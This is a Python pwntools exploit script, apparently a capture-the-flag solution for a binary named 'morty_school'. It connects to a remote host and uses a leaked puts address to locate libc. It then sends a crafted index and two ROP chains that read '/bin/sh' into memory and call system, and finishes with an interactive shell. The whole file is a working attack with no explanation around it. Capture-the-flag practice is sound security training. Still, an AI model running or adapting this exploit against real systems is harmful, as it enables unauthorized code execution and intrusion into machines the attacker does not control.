#!/usr/bin/env python3
import time
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('60.250.197.227', 10003)
#r = process('./morty_school', env = {'LD_PRELOAD': './libc.so.6'})
#gdb.attach(proc.pidof(r)[0])

libc = ELF('./libc.so.6')

morty = 0x6020a0
pop_5 = 0x400d4b
pop_rdi = 0x400d53
pop_rsi_r15 = 0x400d51
read_plt = 0x4006c0
buf = 0x602200

r.recvuntil('Useful information: ')
libc.address = int(r.recvline().strip(), 16) - libc.symbols['puts']
print(f'libc base address = {libc.address:x}')

r.recvuntil('Which Morty you want to teach?\n')
r.sendline(str((0x4005d0 - morty - 0x10) // 24))
r.send(flat(
    pop_5,
    0,
    libc.symbols['read']
).ljust(0x100, b'\x00'))
r.send(flat(
    pop_rdi,
    0,
    pop_rsi_r15,
    buf,
    0,
    read_plt,

    pop_rdi,
    buf,
    libc.symbols['system']
).ljust(0x100, b'A'))

r.send(b'/bin/sh\x00')

r.interactive()
